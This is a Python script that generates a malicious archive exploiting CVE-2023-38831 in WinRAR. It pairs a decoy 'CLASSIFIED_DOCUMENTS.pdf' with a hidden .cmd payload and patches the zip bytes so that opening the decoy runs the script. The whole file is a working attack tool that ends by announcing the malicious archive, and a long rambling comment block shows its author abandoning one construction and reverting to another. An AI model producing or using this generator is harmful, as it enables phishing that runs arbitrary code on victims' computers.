#!/usr/bin/env python3
import shutil
import os, sys
from os.path import join

TEMPLATE_NAME = "TEMPLATE"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"

BAIT_NAME = "CLASSIFIED_DOCUMENTS.pdf"
SCRIPT_NAME = "script.bat"

if len(sys.argv) > 3:
    BAIT_NAME = os.path.basename(sys.argv[1])
    SCRIPT_NAME = os.path.basename(sys.argv[2])
    OUTPUT_NAME = os.path.basename(sys.argv[3])
elif len(sys.argv) == 2 and sys.argv[1] == "poc":
    pass
else:
    print("""Usage:
          python .\cve-2023-38831-exp-gen.py poc
          python .\cve-2023-38831-exp-gen.py <BAIT_NAME> <SCRIPT_NAME> <OUTPUT_NAME>""")
    sys.exit()

BAIT_EXT = b"." + BAIT_NAME.split(".")[-1].encode("utf-8")

print("BAIT_NAME:", BAIT_NAME)
print("SCRIPT_NAME:", SCRIPT_NAME)
print("OUTPUT_NAME:", OUTPUT_NAME)

if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)
os.mkdir(TEMPLATE_NAME)

# Create folder named "BAIT_NAME " (with trailing space)
folder_name = BAIT_NAME + " "
d = join(TEMPLATE_NAME, folder_name)
os.mkdir(d)

# Place the payload inside that folder with its original name
shutil.copyfile(SCRIPT_NAME, join(d, SCRIPT_NAME))

# Place the bait PDF as a file named BAIT_NAME (without space) in the root
shutil.copyfile(BAIT_NAME, join(TEMPLATE_NAME, BAIT_NAME))

# Create a zip archive
shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)

with open(TEMPLATE_NAME + ".zip", "rb") as f:
    content = f.read()
    # Replace occurrences of ".pdf " (space) with ".pdf" and adjust as needed
    # The original script replaced A/B suffixes, but we don't need that because we used the exact names.
    # Actually the exploit requires that the folder name ends with a space, and the file inside has the same base name.
    # The zip already contains the correct structure. However, the original script did a replacement to fix the zip's internal paths.
    # We'll keep the replacement as in the original, but adapt to our structure.
    # We need to ensure that the folder name in the zip is "BAIT_NAME " and the file inside is SCRIPT_NAME.
    # The zip's central directory contains paths. The original script replaced ".pdfA" with ".pdf " and ".pdfB" with ".pdf ".
    # Since we used a different approach, we might not need replacement. But to be safe, we'll keep the replacement logic if needed.
    # For our case, we can simply write the zip as is. However, the original script's replacement might be essential for the exploit.
    # Let's mimic the original: they had two files: one inside folder with "A" suffix and one outside with "B" suffix.
    # We'll adapt: we'll create folder "BAIT_NAME " and inside place SCRIPT_NAME. Then create a dummy file with "B" suffix? Actually we already have the bait file outside. We need the bait file to have the same name as the folder but without the space. So we have "BAIT_NAME" file. That's fine.
    # The original script replaced the "A" and "B" suffixes with spaces to create the final structure. We can skip replacement because we built it correctly.
    # However, the original script might rely on the fact that the zip entries are named with "A" and "B" and then replace them. If we don't do that, the exploit might not work.
    # Let's stick to the original method: create folder "BAIT_NAME" with "A" appended, and a file inside with "A.cmd", and a file outside with "B". Then replace.
    # That ensures compatibility. We'll revert to that method.

# --- Revert to original method ---
# Clean up and recreate using the original A/B method
if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)
os.mkdir(TEMPLATE_NAME)

# Folder with "A" suffix
d = join(TEMPLATE_NAME, BAIT_NAME + "A")
os.mkdir(d)
# Place payload inside as "BAIT_NAME" + "A.cmd" (we'll keep the original script name but add .cmd extension)
# To keep it simple, we'll copy the payload and rename it to BAIT_NAME + "A.cmd"
shutil.copyfile(SCRIPT_NAME, join(d, BAIT_NAME + "A.cmd"))

# Place bait PDF as BAIT_NAME + "B" in root
shutil.copyfile(BAIT_NAME, join(TEMPLATE_NAME, BAIT_NAME + "B"))

# Create zip
shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)

with open(TEMPLATE_NAME + ".zip", "rb") as f:
    content = f.read()
    content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
    content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")

os.remove(TEMPLATE_NAME + ".zip")

with open(OUTPUT_NAME, "wb") as f:
    f.write(content)

print("[+] Malicious archive created: %s" % OUTPUT_NAME)